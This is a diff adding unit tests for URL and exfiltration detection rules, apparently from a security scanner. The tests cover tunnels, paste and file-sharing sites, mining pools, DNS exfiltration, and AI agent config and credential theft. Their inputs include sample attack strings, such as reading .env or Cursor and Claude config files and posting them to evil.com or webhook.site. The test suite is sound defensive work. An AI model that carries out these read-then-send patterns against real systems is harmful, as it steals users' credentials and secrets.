@@ -216,9 +216,358 @@ describe('URL Detection Rules', () => {
     });
   });
 
+  describe('url-private-ip', () => {
+    test('detects 10.x.x.x private IP', () => {
+      testRule('url-private-ip', 'connect to 10.0.0.1 for data', true);
+    });
+    test('detects 192.168.x.x private IP', () => {
+      testRule('url-private-ip', 'host: 192.168.1.100', true);
+    });
+    test('detects 172.16.x.x private IP', () => {
+      testRule('url-private-ip', 'server=172.16.5.50', true);
+    });
+    test('does not flag public IP', () => {
+      testRule('url-private-ip', 'http://8.8.8.8/dns', false);
+    });
+  });
+
+  describe('url-localhost', () => {
+    test('detects localhost URL', () => {
+      testRule('url-localhost', 'fetch("http://localhost:3000/api")', true);
+    });
+    test('detects 127.0.0.1 URL', () => {
+      testRule('url-localhost', 'http://127.0.0.1:8080', true);
+    });
+  });
+
   describe('url-crypto-mining', () => {
     test('detects stratum mining URL', () => {
       testRule('url-crypto-mining', 'stratum+tcp://pool.example.com', true);
+    });
+    test('detects stratum2+tcp', () => {
+      testRule('url-crypto-mining', 'stratum2+tcp://mining.pool.io:3333', true);
+    });
+  });
+
+  describe('url-coinhive', () => {
+    test('detects coinhive reference', () => {
+      testRule('url-coinhive', 'import CoinHive from "coinhive"', true);
+    });
+    test('detects monero miner', () => {
+      testRule('url-coinhive', 'const monero_pool = "pool.supportxmr.com"', true);
+    });
+  });
+
+  // === Tunnel Services ===
+
+  describe('url-localtunnel', () => {
+    test('detects LocalTunnel URL', () => {
+      testRule('url-localtunnel', 'https://myapp.loca.lt/callback', true);
+    });
+  });
+
+  describe('url-serveo', () => {
+    test('detects Serveo URL', () => {
+      testRule('url-serveo', 'https://myservice.serveo.net', true);
+    });
+  });
+
+  describe('url-cloudflare-tunnel', () => {
+    test('detects Cloudflare Tunnel URL', () => {
+      testRule('url-cloudflare-tunnel', 'https://random-name.trycloudflare.com/api', true);
+    });
+  });
+
+  describe('url-pagekite', () => {
+    test('detects PageKite URL', () => {
+      testRule('url-pagekite', 'https://myapp.pagekite.me/hook', true);
+    });
+  });
+
+  describe('url-bore-tunnel', () => {
+    test('detects bore tunnel URL', () => {
+      testRule('url-bore-tunnel', 'http://abc123.bore.pub:3000', true);
+    });
+  });
+
+  // === Paste Sites (additional) ===
+
+  describe('url-hastebin', () => {
+    test('detects hastebin URL', () => {
+      testRule('url-hastebin', 'https://hastebin.com/raw/abcdef', true);
+    });
+  });
+
+  describe('url-ghostbin', () => {
+    test('detects ghostbin URL', () => {
+      testRule('url-ghostbin', 'https://ghostbin.co/paste/xyz123', true);
+    });
+  });
+
+  describe('url-privatebin', () => {
+    test('detects PrivateBin URL', () => {
+      testRule('url-privatebin', 'https://privatebin.net/?abc123def456', true);
+    });
+  });
+
+  describe('url-rentry', () => {
+    test('detects Rentry.co URL', () => {
+      testRule('url-rentry', 'https://rentry.co/mypage', true);
+    });
+  });
+
+  // === File Sharing ===
+
+  describe('url-file-io', () => {
+    test('detects file.io URL', () => {
+      testRule('url-file-io', 'curl https://file.io/abc123', true);
+    });
+  });
+
+  describe('url-transfer-sh', () => {
+    test('detects transfer.sh URL', () => {
+      testRule('url-transfer-sh', 'https://transfer.sh/data/secrets.tar', true);
+    });
+  });
+
+  describe('url-anonfiles', () => {
+    test('detects anonfiles URL', () => {
+      testRule('url-anonfiles', 'https://anonfiles.com/x8b3f4', true);
+    });
+  });
+
+  describe('url-gofile', () => {
+    test('detects GoFile URL', () => {
+      testRule('url-gofile', 'https://gofile.io/d/Abc123', true);
+    });
+  });
+
+  describe('url-catbox', () => {
+    test('detects Catbox URL', () => {
+      testRule('url-catbox', 'https://files.catbox.moe/payload.sh', true);
+    });
+  });
+
+  // === DNS Exfiltration ===
+
+  describe('dns-exfil-pattern', () => {
+    test('detects hex-encoded subdomain (DNS exfil pattern)', () => {
+      testRule('dns-exfil-pattern', 'aabbccddeeff00112233445566778899.c2.attacker.com', true);
+    });
+    test('does not flag normal domain', () => {
+      testRule('dns-exfil-pattern', 'api.example.com', false);
+    });
+  });
+
+  describe('dns-txt-lookup', () => {
+    test('detects DNS TXT lookup', () => {
+      testRule('dns-txt-lookup', 'dns.resolve("example.com", "TXT")', true);
+    });
+    test('detects nslookup TXT', () => {
+      testRule('dns-txt-lookup', 'nslookup -type=txt c2.attacker.com', true);
+    });
+  });
+
+  // === WebSocket ===
+
+  describe('url-websocket-raw-ip', () => {
+    test('detects WebSocket to raw IP', () => {
+      testRule('url-websocket-raw-ip', 'new WebSocket("ws://185.220.101.10:4444")', true);
+    });
+    test('detects wss to raw IP', () => {
+      testRule('url-websocket-raw-ip', 'wss://10.0.0.1:8080', true);
+    });
+  });
+
+  describe('url-websocket-suspicious', () => {
+    test('detects generic WebSocket URL', () => {
+      testRule('url-websocket-suspicious', 'ws://attacker.example.com/socket', true);
+    });
+  });
+
+  // === Dynamic DNS ===
+
+  describe('url-duckdns', () => {
+    test('detects DuckDNS URL', () => {
+      testRule('url-duckdns', 'https://myhost.duckdns.org/exfil', true);
+    });
+  });
+
+  describe('url-no-ip', () => {
+    test('detects No-IP URL', () => {
+      testRule('url-no-ip', 'https://attacker.no-ip.com/data', true);
+    });
+    test('detects noip URL', () => {
+      testRule('url-no-ip', 'http://c2.ddns.net/cmd', true);
+    });
+  });
+
+  // === Canary Tokens ===
+
+  describe('url-canarytokens', () => {
+    test('detects Canary token URL', () => {
+      testRule('url-canarytokens', 'https://canarytokens.com/abc123/index.html', true);
+    });
+  });
+
+  // === Additional Request Capture Services ===
+
+  describe('url-beeceptor', () => {
+    test('detects Beeceptor URL', () => {
+      testRule('url-beeceptor', 'https://myapi.free.beeceptor.com/hook', true);
+    });
+  });
+
+  describe('url-mockbin', () => {
+    test('detects Mockbin URL', () => {
+      testRule('url-mockbin', 'https://mockbin.org/bin/abc123', true);
+    });
+  });
+
+  describe('url-webhook-online', () => {
+    test('detects webhook.online URL', () => {
+      testRule('url-webhook-online', 'https://myapp.webhook.online/receive', true);
+    });
+  });
+
+  describe('url-hookdeck', () => {
+    test('detects Hookdeck URL', () => {
+      testRule('url-hookdeck', 'https://events.hookdeck.com/e/src_abc123', true);
+    });
+  });
+
+  describe('url-runscope', () => {
+    test('detects Runscope URL', () => {
+      testRule('url-runscope', 'https://myapi.runscope.net/api/v1', true);
+    });
+  });
+
+  describe('url-smee', () => {
+    test('detects Smee.io URL', () => {
+      testRule('url-smee', 'https://smee.io/abc123xyz', true);
+    });
+  });
+
+  describe('url-typedwebhook', () => {
+    test('detects TypedWebhook URL', () => {
+      testRule('url-typedwebhook', 'https://typedwebhook.tools/abcdef', true);
+    });
+  });
+
+  describe('url-webhook-test', () => {
+    test('detects webhook.test URL', () => {
+      testRule('url-webhook-test', 'https://myapp.webhook.test/recv', true);
+    });
+  });
+
+  describe('url-webhook-relay', () => {
+    test('detects Webhook Relay URL', () => {
+      testRule('url-webhook-relay', 'https://my-bucket.webhookrelay.com/v1/webhooks', true);
+    });
+  });
+
+  describe('url-pipedream', () => {
+    test('detects Pipedream URL', () => {
+      testRule('url-pipedream', 'https://abc123.m.pipedream.net', true);
+    });
+  });
+
+  describe('url-pipedream-eo', () => {
+    test('detects Pipedream eo API URL', () => {
+      testRule('url-pipedream-eo', 'https://myflow.eo.pipedream.net/event', true);
+    });
+  });
+
+  // === Tor (additional) ===
+
+  describe('url-tor-proxy', () => {
+    test('detects tor2web proxy', () => {
+      testRule('url-tor-proxy', 'https://abc123.tor2web.com/hidden', true);
+    });
+    test('detects .onion.to proxy', () => {
+      testRule('url-tor-proxy', 'https://xyz.onion.to/page', true);
+    });
+  });
+
+  describe('url-i2p', () => {
+    test('detects I2P address', () => {
+      testRule('url-i2p', 'fetch("http://myservice.i2p/api")', true);
+    });
+  });
+
+  // === Agent Credential Theft (additional) ===
+
+  describe('agent-env-exfil-claude', () => {
+    test('detects Claude Desktop config exfiltration', () => {
+      testRule('agent-env-exfil-claude', 'readFile("claude_desktop_config.json") then webhook.site/post', true);
+    });
+  });
+
+  describe('agent-env-exfil-cursor', () => {
+    test('detects Cursor config exfiltration', () => {
+      testRule('agent-env-exfil-cursor', 'readFile(".cursor/mcp/config.json") http.post("http://evil.com")', true);
+    });
+  });
+
+  describe('agent-config-read-post', () => {
+    test('detects read-then-POST exfiltration pattern', () => {
+      testRule('agent-config-read-post', 'readFileSync(".env") ... fetch("https://evil.com/post", {method:"POST"})', true);
+    });
+    test('detects credentials readFile + axios', () => {
+      testRule('agent-config-read-post', 'fs.readFile("credentials.json", ...) axios.post(url, data)', true);
+    });
+  });
+
+  // === Additional Exfiltration Services (Issue #12) ===
+
+  describe('url-oastify', () => {
+    test('detects Burp Suite oastify URL', () => {
+      testRule('url-oastify', 'https://abc123.oastify.com/callback', true);
+    });
+  });
+
+  describe('url-webhook-cool', () => {
+    test('detects webhook.cool URL', () => {
+      testRule('url-webhook-cool', 'https://app.webhook.cool/recv', true);
+    });
+  });
+
+  describe('url-putsreq', () => {
+    test('detects PutsReq URL', () => {
+      testRule('url-putsreq', 'https://putsreq.com/AbCd1234EfGh', true);
+    });
+  });
+
+  describe('url-free-beeceptor', () => {
+    test('detects any Beeceptor subdomain', () => {
+      testRule('url-free-beeceptor', 'https://mytest.beeceptor.com/api', true);
+    });
+  });
+
+  describe('url-tailscale-funnel', () => {
+    test('detects Tailscale Funnel URL', () => {
+      testRule('url-tailscale-funnel', 'https://tail12345.ts.net/hook', true);
+    });
+  });
+
+  describe('url-loca-tunnel', () => {
+    test('detects localhost.run tunnel', () => {
+      testRule('url-loca-tunnel', 'https://abc123.lhr.life/data', true);
+    });
+  });
+
+  describe('url-expose-dev', () => {
+    test('detects Expose.dev tunnel', () => {
+      testRule('url-expose-dev', 'https://myapp.sharedwithexpose.com/api', true);
+    });
+  });
+
+  describe('url-bin-sh', () => {
+    test('detects httpbin POST endpoint', () => {
+      testRule('url-bin-sh', 'fetch("https://httpbin.org/post", {method:"POST", body: data})', true);
+    });
+    test('detects httpbin anything endpoint', () => {
+      testRule('url-bin-sh', 'axios.get("https://httpbin.org/anything")', true);
     });
   });
 });
